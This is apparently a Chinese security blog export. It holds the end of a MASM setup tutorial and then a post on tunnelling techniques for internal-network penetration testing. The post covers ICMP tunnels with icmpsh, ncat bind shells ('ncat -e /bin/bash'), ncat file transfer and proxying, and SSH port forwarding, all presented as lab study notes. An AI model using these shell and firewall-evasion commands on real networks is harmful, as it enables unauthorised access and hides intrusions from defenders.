data-num="22"></td><td><pre>     	    INT      <span class="token number">21</span>H</pre></td></tr><tr><td data-num="23"></td><td><pre> CODE     ENDS</pre></td></tr><tr><td data-num="24"></td><td><pre>          END    START                       	<span class="token punctuation">;</span>汇编结束</pre></td></tr></table></figure><h2 id="0x02汇编语言数据"><a class="anchor" href="#0x02汇编语言数据">#</a> 0x02 汇编语言数据</h2>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117175438820.png" alt="image-20220117175438820" /></p>
<ul>
<li>标识符（identifier ）</li>
<li>保留字（reserved word）</li>
<li>分界符（delimiter ）</li>
<li>注释 （note ）</li>
</ul>
<p><strong>保留字</strong>： 是系统预先保留下来的具有特殊含义的符号；<br />
<strong>标号</strong>： 指令性语句的符号地址；<br />
<strong>表达式</strong>： 由运算对象及运算符组合。</p>
<p><strong>变量</strong>：在除代码段以外的其他段被定义，用来定义存放在存储单元中的数据，在汇编程序中可以修改变量的值。</p>
<ul>
<li>变量表示定义数据项中第一个字节在现行段中的地址偏移量；</li>
<li>定义变量就是给变量分配存储单元，起一个名字，并为之赋初值；</li>
<li>定义变量是由伪指令完成的。</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117175529930.png" alt="image-20220117175529930" /></p>
<p><strong>变量的三个属性</strong>：</p>
<ul>
<li>段值 (Segment): 变量单元所在段的段地址；</li>
<li>偏移量 (Offset): 变量单元地址与段的起始地址之间的字节数；</li>
<li>类型 (Type): 变量有三种类型：字节（Bytes）、字 （Word）、双字（Double Word）；</li>
</ul>
<p><strong>标号</strong>： 标号是指令性语句的符号地址。是转移指令和调用指令的目的地址。</p>
<ul>
<li>标号和变量类似，都是存储单元的地址。</li>
<li>但是，标号对应的是存储单元中存放的是指令。</li>
<li>而变量对应的是存储单元中存放的是数据。</li>
</ul>
<p><strong>标号的三个属性</strong>：</p>
<ul>
<li>段值 (Segment): 指令目标代码所在段的段地址；</li>
<li>偏移量 (Offset): 指令目标代码首字节与段的起始地址之间的字节数；</li>
<li>类型 (Type): 标号的类型有两种： 近（Near）、远（FAR）。</li>
</ul>
<h2 id="0x03汇编语言环境搭建"><a class="anchor" href="#0x03汇编语言环境搭建">#</a> 0x03 汇编语言环境搭建</h2>
<h3 id="1安装visual-studio"><a class="anchor" href="#1安装visual-studio">#</a> 1. 安装 Visual Studio</h3>
<p>Visual Studio 2015 或 2017 或 2019 等其他版本均可，小编这里使用的是 2022 版本的 Visual Studio</p>
<p>确保网络流畅的时候安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117195150037.png" alt="image-20220117195150037" /></p>
<p>勾选所需服务</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117195415424.png" alt="image-20220117195415424" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117195557725.png" alt="image-20220117195557725" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117195633718.png" alt="image-20220117195633718" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117195946929.png" alt="image-20220117195946929" /></p>
<p>勾选完成后进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117201324619.png" alt="image-20220117201324619" /></p>
<p>启动后，选择 C++ 开发设置</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117202719235.png" alt="image-20220117202719235" /></p>
<h3 id="2新建项目"><a class="anchor" href="#2新建项目">#</a> 2. 新建项目</h3>
<p>在 Visual Studio 2022 中创建新项目，选择 “空项目”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117202904964.png" alt="image-20220117202904964" /></p>
<p>选择项目属性</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117203027711.png" alt="image-20220117203027711" /></p>
<p>新项目建好后，右键新建项目 -&gt; 选择属性</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117182527574.png" alt="image-20220117182527574" /></p>
<p>在属性面板中选择 “高级” 选项，将入口点改为 “main”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117182706439.png" alt="image-20220117182706439" /></p>
<p>右键新建项目 -&gt; 选择生成依赖项 -&gt; 生成自定义</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117182254291.png" alt="image-20220117182254291" /></p>
<p>在生成自定义文件弹窗中勾选 masm</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117182404011.png" alt="image-20220117182404011" /></p>
<p><strong>注：一定要先修改生成依赖项后再添加源文件！</strong></p>
<h3 id="3添加源文件"><a class="anchor" href="#3添加源文件">#</a> 3. 添加源文件</h3>
<p>默认为 c++ 文件，但我们用的是汇编语言，所以需要手动修改为.asm 文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117183132244.png" alt="image-20220117183132244" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117183248532.png" alt="image-20220117183248532" /></p>
<p>右键 “.asm” 源文件 — “属性” — “配置属性 — 常规 — 项类型” — 选择 Microsoft Macro Assembler</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118133849360.png" alt="image-20220118133849360" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118132548095.png" alt="image-20220118132548095" /></p>
<p>右键解决方案中的项目名 — “属性” — “配置属性 — 链接器” 更改项目属性：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118133410363.png" alt="image-20220118133410363" /></p>
<ul>
<li>“调试” — “生成调试信息” 选择 “生成调试信息（/DEBUG）”</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118132723943.png" alt="image-20220118132723943" /></p>
<ul>
<li>“系统” — “子系统” 选择 “控制台（/SUBSYSTEM:CONSOLE）”</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118132842804.png" alt="image-20220118132842804" /></p>
<ul>
<li>解决方案配置管理器选择 “x86”</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220118132900795.png" alt="image-20220118132900795" /></p>
<p>使用一下测试代码进行测试</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="4"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="5"></td><td><pre>ExitProcess PROTO<span class="token punctuation">,</span> dwExitCode <span class="token operator">:</span> DWORD</pre></td></tr><tr><td data-num="6"></td><td><pre>MessageBoxA PROTO hWnd <span class="token operator">:</span> DWORD<span class="token punctuation">,</span> lpText <span class="token operator">:</span> BYTE<span class="token punctuation">,</span> lpCaption <span class="token operator">:</span> BYTE<span class="token punctuation">,</span> uType <span class="token operator">:</span> DWORD</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="8"></td><td><pre>Number DWORD <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>text db <span class="token string">"shellcode"</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="11"></td><td><pre>main proc</pre></td></tr><tr><td data-num="12"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">6</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	add eax<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="15"></td><td><pre>	add eax<span class="token punctuation">,</span>Number</pre></td></tr><tr><td data-num="16"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="18"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="19"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	call MessageBoxA</pre></td></tr><tr><td data-num="21"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">16</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="23"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="24"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117184145745.png" alt="image-20220117184145745" /></p>
<p>添加代码高亮插件，点击上方 “扩展” 进入 “扩展管理” 后，在搜索框中输入 “Asm” 即可找到相关插件进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117184408271.png" alt="image-20220117184408271" /></p>
<p>退出即可自动安装扩展程序</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117190806472.png" alt="image-20220117190806472" /></p>
<p>安装完成后，代码即可显示高亮</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117192626993.png" alt="image-20220117192626993" /></p>
<p>PS：在 22 版中并没有找到相关插件！需手动下载</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hKTGViYmluay9hc20tZHVkZS9yZWxlYXNlcw==">项目地址</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117205551863.png" alt="image-20220117205551863" /></p>
<p>进入如下地址，将 vsix 文件直接拖拽到该窗口即可进行安装</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token operator">:</span>\Program Files\Microsoft Visual Studio\<span class="token number">2022</span>\Community\Common7\IDE</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117210335793.png" alt="image-20220117210335793" /></p>
<p>打开命令窗口进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117210549221.png" alt="image-20220117210549221" /></p>
<p>安装失败，点击左下角查看安装日志，发现微软更新了应用，但是并没有什么用瞬间 emo！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117210639179.png" alt="image-20220117210639179" /></p>
<p>进行调试，结果显示如图即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220117185339664.png" alt="image-20220117185339664" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈内网渗透中有关隧道的那些事儿</title>
    <url>/article/cdbe6e7b.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>近一个月来，忙着期末复习内网的学习也就暂停了一段时间，所幸这几天考完了。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102181746.jpg" alt="image-20220102181746" /></p>
<p>这边我们回顾一下之前学习内网的相关知识的时候，发现内网的攻防更多的是流量的出入，也就是，所谓的内网安全的大基础是让内网的主机流量能够出入，不被发现，在内网中一般是会存在相关的检测设备的，普通的数据流量很容易就被检测出来。</p>
<p>在渗透测试中，进入内网后，要判断流量是否能够出的去、进的来。隐藏通信隧道的情况一般常用于在访问受限的的网络环境中追踪数据流向和在非受信任网络环境找那个实现安全的数据传输。</p>
<h2 id="一-什么是隧道"><a class="anchor" href="#一-什么是隧道">#</a> 一、什么是隧道？</h2>
<p>一般的网络通信流程是：在两台主机上建立 TCP 链接，然后进行正常的数据通信，在知道 IP 地址的情况下，可以直接发送报文，如果不知道 IP 地址的话，就需要将域名解析为 IP 地址。在实际的网络情况下，流量会经过很多的边界设备，在一般的企业内网中，可能会存在 IDP、IPS、防火墙等设备，如果异常的话，就会直接将通信阻断；这里我们说的隧道，就是绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包达到了另外的地址的时候，解包还原，并将还原后的数据包发送到相应的服务器上。</p>
<p><strong>常见的隧道包括三个大类：网络层、应用层、传输层</strong></p>
<h4 id="隧道"><a class="anchor" href="#隧道">#</a> <strong>隧道</strong></h4>
<p>判断内网的连通性是指判断机器是否上外网等，要综合判断各种协议（ <code>TCP</code> 、 <code>HTTP</code> 、 <code>DNS</code> 、 <code>ICMP</code> 、等）及端口的通信情况，常见的流量出口端口有： <code>80</code> 、 <code>8080</code> 、 <code>443</code> 、 <code>53</code> 、 <code>110</code> 、 <code>123</code>  等。常见的内网连通性判断如下：</p>
<ul>
<li>ICMP 协议 就是我们常说的 ping 命令，ping 命令使用的就是 ICMP 协议。语法为：ping &lt;域名或 IP&gt;</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102182234399.png" alt="image-20220102182234399" /></p>
<h4 id="tcp协议"><a class="anchor" href="#tcp协议">#</a> <strong>TCP 协议：</strong></h4>
<p>netcat 简称（NC），被称为网络界的瑞士军刀，小巧但是功能强大，通过使用 TCP 或者 UDP 进行网络连接进行通信，他是一个 CS 结构的服务，需要在服务器监听，然后客户端连接，基本使用如下：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ldGVybmFsbHlib3JlZC5vcmcvbWlzYy9uZXRjYXQv">网络测试工具 NETCAT 官方下载</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/f74ae9614bc4a2d3bdc2ea38747d8afc.png" alt="img" /></p>
<p>服务端：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102182846922.png" alt="image-20220102182846922" /></p>
<p>将自己的 CMD 放在 80 端口，并且等待连接，-lvp 分别表示，监听、输出版本信息、持久化。客户端连接成功后，就可以执行 CMD 的命令。</p>
<p>然后在客户端连接，可以执行命令：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102183221947.png" alt="image-20220102183221947" /></p>
<h4 id="http协议"><a class="anchor" href="#http协议">#</a> <strong>HTTP 协议</strong></h4>
<p>curl 是一个可以利用 URl 规则在命令行下工作的综合文件传输工具，支持文件的上传和下载，curl 命令不仅支持 HTTP、HTTPS、FTP 等多种协议，还支持 POST、Cookie、认证、从指定的位置下载文件。在 Liunx 环境下是有 curl 的环境的，windows 下 powershell 自带 curl，否则需要下载，这里我在 liunx 中测试：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102183453497.png" alt="image-20220102183453497" /></p>
<p>在 powershell 中测试：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102184030185.png" alt="image-20220102184030185" /></p>
<h4 id="dns协议"><a class="anchor" href="#dns协议">#</a> DNS 协议</h4>
<p>在进行 DNS 连通性测试的时候，常用的命令为 nslookup 和 dig</p>
<p>nslookup 是 windows 自带的 DNS 探测命令，在没有指定 IP 的时候，会从系统网络中的 TCP/IP 的协议中读取 DNS 地址。：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102184348822.png" alt="image-20220102184348822" /></p>
<p><strong>网络层隧道技术</strong></p>
<p>在网络层，两个常用的隧道协议是 IPv6 和 ICMP</p>
<h2 id="二-icmp隧道"><a class="anchor" href="#二-icmp隧道">#</a> 二、ICMP 隧道</h2>
<p>​    ICMP 隧道简单实用，不需要开放端口就可以进行通信。常见命令是 ping 命令，在一般情况下，每一个 ping 命令都会回复消息</p>
<p>在一些网络环境中，在使用一些上层隧道都失效以后（例如 HTTP 隧道之类的），常常会使用 ping 命令访问远程的计算机，使用 ICMP 可以使用将包封装在 ICMP 中，从而穿过防火墙达到目标，而不受网络限制，需要客户端和服务端都能够使用 ICMP 协议</p>
<p>常用的 ICMP 隧道工具有：icmpsh、Pingtunnel、powershell icmp</p>
<p>icmpsh</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>echo <span class="token number">0</span> <span class="token operator">></span><span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>net<span class="token operator">/</span>ipv4<span class="token operator">/</span>icmp_echo_ignore_all  <span class="token comment"># 临时允许 ICMP</span></pre></td></tr></table></figure><p>icmpsh 工具使用简单，便携的跨平台工具，并且使用的时候不需要管理员权限，使用的环境是在 windows 上，使用 ICMP 还能够进行流量的隐藏</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lucXVpc2IvaWNtcHNo">项目地址</span></p>
<p>受控端直接下载（这里是在本地环境，真实环境上传 ipcmpsh.exe 就好）：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102184609494.png" alt="image-20220102184609494" /></p>
<p>服务端下载：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102185120824.png" alt="image-20220102185120824" /></p>
<p>然后关闭服务端的 ICMP 应答：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>sysctl <span class="token operator">-</span>w net<span class="token punctuation">.</span>ipv4<span class="token punctuation">.</span>icmp_echo_ignore_all<span class="token operator">=</span><span class="token number">1</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102185258877.png" alt="image-20220102185258877" /></p>
<p>配置环境：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>yum <span class="token operator">-</span>y install epel<span class="token operator">-</span>release</pre></td></tr><tr><td data-num="2"></td><td><pre>yum <span class="token operator">-</span>y install python<span class="token operator">-</span>pip</pre></td></tr><tr><td data-num="3"></td><td><pre>pip install <span class="token operator">-</span><span class="token operator">-</span>upgrade pip <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token operator">//</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</pre></td></tr><tr><td data-num="4"></td><td><pre>pip install Impacket <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token operator">//</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102185443519.png" alt="image-20220102185443519" /></p>
<p>服务端启动：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python icmpsh_m<span class="token punctuation">.</span>py <span class="token operator">&lt;</span>vpsIP<span class="token operator">></span> <span class="token operator">&lt;</span>受控端IP<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102185740055.png" alt="image-20220102185740055" /></p>
<p>客户端连接：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102184913449.png" alt="image-20220102184913449" /></p>
<p>当我们运行以后，就可以得到一个 shell.</p>
<p><strong>传输层隧道技术</strong></p>
<pre><code>传输层数据隧道包括TCP隧道、UDP隧道、和常规的端口转发。在内网渗透中，如果防火墙对某些端口进行了限制的话，在获得目标权限以后可以打开需要的端口，要是内网中存在大量的防护设备的话，TCP、UDP流量会大量拦截。
</code></pre>
<h4 id="netcat使用"><a class="anchor" href="#netcat使用">#</a> Netcat 使用</h4>
<p>被称为网络安全的瑞士军刀，可以用作端口监听、端口扫描、远程文件传输、还可以实现远程 shell 等功能</p>
<p>目前我使用的是 Nmap 自带的 ncat，相比于原来的 nc，更加方便和简单，直接安装 nmap 就自带了 nc</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9kb3dubG9hZC5odG1s">官网链接</span></p>
<p>我在本机安装了 nmap 以后，就可以直接输入 ncat-v 查看信息：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190313790.png" alt="image-20220102190313790" /></p>
<p>基本使用：</p>
<p>Ncat 是一个 c/s 工具，需要服务端和客户端一起使用，首先我们在服务器上监听端口：</p>
<p>nact -lvvp 85 表示监听 85 端口</p>
<p>-l：表示监听</p>
<p>-v：显示版本信息等</p>
<p>-p：监听的端口</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190418391.png" alt="image-20220102190418391" /></p>
<p>客户端连接我们的服务：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ncat <span class="token operator">-</span>v <span class="token operator">&lt;</span>ip<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190626375.png" alt="image-20220102190626375" /></p>
<p>服务端收到消息:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190642355.png" alt="image-20220102190642355" /></p>
<p>接着我们就可以进行交互了，想要执行命令的话，还需要使用 -e 参数，将自己的 shell 推出去，如下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190753139.png" alt="image-20220102190753139" /></p>
<p>执行命令：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102190830246.png" alt="image-20220102190830246" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>发送文件</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 从 HOST1（Client） 发送文件到 HOST2（Server） 的 TCP 9899 端口</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># HOST2：</span></pre></td></tr><tr><td data-num="4"></td><td><pre>$ ncat <span class="token operator">-</span>l <span class="token number">9899</span> <span class="token operator">></span> outputfile </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#HOST1：</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$ ncat HOST2 <span class="token number">9899</span> <span class="token operator">&lt;</span> inputfile</pre></td></tr></table></figure><p>服务端监听： <code>ncat -lv 85 &gt; 接收.txt</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191055911.png" alt="image-20220102191055911" /></p>
<p>客户端创建文本，然后发送： <code>ncat -v 127.0.0.1 85 &lt; 发送.txt</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191341749.png" alt="image-20220102191341749" /></p>
<p>在服务端就可以看到这个新出的文本：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191418126.png" alt="image-20220102191418126" /></p>
<p>端口转发</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 重定向本机 9999 TCP 端口到 httpbin.org 的 80 端口</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    $ ncat <span class="token operator">-</span><span class="token operator">-</span>sh<span class="token operator">-</span><span class="token keyword">exec</span> <span class="token string">"ncat 127.0.0.1 80"</span> <span class="token operator">-</span>l <span class="token number">9999</span> <span class="token operator">-</span><span class="token operator">-</span>keep<span class="token operator">-</span><span class="token builtin">open</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    传递Shell</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># 在本机的 8080 端口分享 Bash Shell，让对方可以通过网络访问此端口来自由访问 Bash Shell</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    $ ncat <span class="token operator">-</span>e <span class="token string">"/bin/bash"</span> <span class="token operator">-</span>l <span class="token number">8080</span> <span class="token operator">-</span><span class="token operator">-</span>keep<span class="token operator">-</span><span class="token builtin">open</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191553349.png" alt="image-20220102191553349" /></p>
<p>客户端执行命令：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191753898.png" alt="image-20220102191753898" /></p>
<p>创建隧道：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 将本地的 8080 端口作为隧道端口</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    ncat <span class="token operator">-</span>l <span class="token operator">-</span><span class="token operator">-</span>proxy<span class="token operator">-</span><span class="token builtin">type</span> http <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token number">8080</span> <span class="token operator">-</span><span class="token operator">-</span>proxy<span class="token operator">-</span>auth username<span class="token punctuation">:</span>password</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment"># --porxy-type 指定隧道类型</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment"># --porxy-auth 指定隧道连接密码用户</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># 虽然在 Nact 中写了能够使用 socks4 和 socks5，但是实践中只能使用 HTTP</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102191907784.png" alt="image-20220102191907784" /></p>
<p>可通过代理查看本机此时的 ip。</p>
<p>在内网中建立稳定的隧道是我们做好内网的关键一步，在内网中，用应用层的隧道技术就是使用各种不同的应用服务提供的端口进行数据的转发。常用的隧道协议有：DNS、SSH、HTTP/HTTPS。</p>
<h2 id="三-ssh隧道"><a class="anchor" href="#三-ssh隧道">#</a> 三、SSH 隧道</h2>
<p>​    在内网中，几乎所有的内网 LIUNX/UNIX 主机都是支持 SSH 协议的，一般情况下防火墙是不会拦截 SSH 的流量的，同时在传输的时候，SSH 的流量是加密的，所以很难区分是否是正常的传输还是恶意的流量。当我们使用 SSH 建立了隧道以后，我们可以建立之前我们不能建立的 TCP 隧道之类的。</p>
<p>在什么地方我们使用得到 SSH 隧道呢，工作中由于防火墙导致访问某些网站或某些 FTP 等资源连接超时。</p>
<p>基本的 SSH 命令就是我们登陆的命令：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ssh root@ip</pre></td></tr></table></figure><p>创建 SSH 隧道常用的命令如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span><span class="token constant">C</span> 压缩传输，增加传输的效率，</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span>f 将<span class="token constant">SSH</span>传输放在后台执行，不占用当前的<span class="token constant">SHELL</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span><span class="token constant">N</span> 建立静默连接，就是建立了连接，但是看不到具体的会话；还有一种说法是不允许执行命令</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>g 允许远程主机连接本地用于转发端口</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span><span class="token constant">L</span> 本地端口转发</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span><span class="token constant">R</span> 远程端口转发</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">-</span><span class="token constant">D</span> 动态转发</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">-</span><span class="token constant">P</span> 指定<span class="token constant">SSH</span>的端口</pre></td></tr></table></figure><p>后续我们都会使用上面的参数进行配置</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>端口转发</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>这种转发方式是将本地的某个端口转发到另一个端口，例如我现在的服务上有一个web服务在<span class="token number">80</span>端口，那么我可以使用ssh将本地的<span class="token number">80</span>端口转发到<span class="token number">8080</span>端口，然后进行访问<span class="token number">8080</span>，就可以直接访问<span class="token number">80</span>端口，现在我在网站上打开<span class="token number">80</span>端口的服务：</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>然后我在服务端启动一下<span class="token constant">SSH</span>的本地转发：</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"> ssh -L 8080:127.0.0.1:80 -fN 127.0.0.1 </span><span class="token template-punctuation string">`</span></span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -L 8080 是指转发到的端口；127.0.0.1:80 是转发的端口，他们之间用分号隔开</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token comment"># -fN f 是指在后台运行；N 是指建立静默连接</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token comment"># 最后的 IP 是跳板机的 IP</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment"># 这里的含义就是，访问本地的 8080 端口，就会将请求转发给本地的 80 端口 G0_WnQQb!Mln</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220102193048722.png" alt="image-20220102193048722" /></p>
